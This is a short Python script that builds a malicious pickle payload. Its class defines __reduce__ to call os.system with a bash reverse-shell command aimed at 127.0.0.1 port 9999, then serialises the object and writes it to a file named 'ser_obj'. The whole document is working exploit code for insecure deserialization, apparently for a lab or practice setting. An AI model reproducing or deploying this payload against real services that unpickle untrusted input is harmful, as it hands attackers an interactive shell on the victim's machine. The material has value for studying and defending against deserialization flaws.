#!/usr/bin/python
import pickle
import os
class A(object):
    def __reduce__(self):
        a = 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
        return (os.system,(a,))    
a=A()
result = pickle.dumps(a)
print(result)
with open('ser_obj', 'wb') as file:
    file.write(bytearray(result))
# pickle.loads(result)
